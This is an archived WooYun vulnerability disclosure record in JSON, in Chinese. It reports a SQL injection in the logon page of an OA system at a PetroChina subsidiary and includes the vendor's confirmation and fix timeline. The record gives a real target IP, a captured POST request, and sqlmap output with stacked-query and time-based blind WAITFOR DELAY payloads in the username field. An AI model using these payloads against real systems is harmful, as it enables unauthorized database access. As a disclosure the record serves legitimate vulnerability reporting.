{"id": 47486, "wybug_id": "wooyun-2014-086522", "wybug_title": "中国石油天然气集团公司某子公司OA系统存在SQL注入", "wybug_corp": "中国石油天然气集团公司", "wybug_author": "aaaaty", "wybug_date": "2014-12-09 15:40", "wybug_open_date": "2015-01-23 15:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-23：\t细节向公众公开  简要描述： 我为祖国献石油~~ 详细说明：  中国石油天然气集团公司某子公司OA系统存在SQL注入<codehttp://219.142.40.227/Logon.aspx></code>post注入\nPOST /Logon.aspx HTTP/1.1Host: 219.142.40.227Proxy-Connection: keep-aliveContent-Length: 457Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://219.142.40.227User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://219.142.40.227/Logon.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=p2i0t055lnsnj0myguurfv55__VIEWSTATE=%2FwEPDwUKLTI1NzIyMTc4MA8WAh4IV29ya0l0ZW1lFgICAw9kFgICAQ8PFgIeBFRleHQFOeaCqOi%2Bk%2BWFpeeahOeUqOaIt%2BWQjeaIluWPo%2BS7pOacieivr%2B%2B8jOivt%2BmHjeaWsOi%2Bk%2BWFpe%2B8gWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQljbWRQb3J0YWwJ2jzdrn%2F3c3wuAQY5B5vo5%2FIPWA%3D%3D&__VIEWSTATEGENERATOR=5A2128B1&__EVENTVALIDATION=%2FwEWBAKwgc%2BHBQKl1bKzCQLv8pOuDAK1qbSRC7S6S24l%2FftjGpgDQHThvIPtJtLd&txtUserName=&cmdPortal.x=37&cmdPortal.y=36&txtPassword=\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtUserName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKLTI1NzIyMTc4MA8WAh4IV29ya0l0ZW1lFgICAw9kFgICAQ8PFgIeBFRleHQFOeaCqOi+k+WFpeeahOeUqOaIt+WQjeaIluWPo+S7pOacieivr++8jOivt+mHjeaWsOi+k+WFpe+8gWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQljbWRQb3J0YWwJ2jzdrn/3c3wuAQY5B5vo5/IPWA==&__VIEWSTATEGENERATOR=5A2128B1&__EVENTVALIDATION=/wEWBAKwgc+HBQKl1bKzCQLv8pOuDAK1qbSRC7S6S24l/ftjGpgDQHThvIPtJtLd&txtUserName=Knnd'; WAITFOR DELAY '0:0:5'--&cmdPortal.x=1&cmdPortal.y=1&txtPassword=CiTs    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKLTI1NzIyMTc4MA8WAh4IV29ya0l0ZW1lFgICAw9kFgICAQ8PFgIeBFRleHQFOeaCqOi+k+WFpeeahOeUqOaIt+WQjeaIluWPo+S7pOacieivr++8jOivt+mHjeaWsOi+k+WFpe+8gWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQljbWRQb3J0YWwJ2jzdrn/3c3wuAQY5B5vo5/IPWA==&__VIEWSTATEGENERATOR=5A2128B1&__EVENTVALIDATION=/wEWBAKwgc+HBQKl1bKzCQLv8pOuDAK1qbSRC7S6S24l/ftjGpgDQHThvIPtJtLd&txtUserName=Knnd' WAITFOR DELAY '0:0:5'--&cmdPortal.x=1&cmdPortal.y=1&txtPassword=CiTs---[15:27:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[15:27:25] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\219.142.40.227'速度太慢了，表没有跑完，只是为证明漏洞存在性，未进一步深入\n\n   漏洞证明：     修复方案：  敏感字符过滤。   版权声明：转载请注明来源 aaaaty@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-12-10 16:45 厂商回复： 感谢，正在整改 最新状态： 2014-12-15：已整改完毕，感谢。  ", "replys": "漏洞评价：\n评论\n     2014-12-09 16:26 |    \t\t毛猴 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:18        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  我为祖国挖石油！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}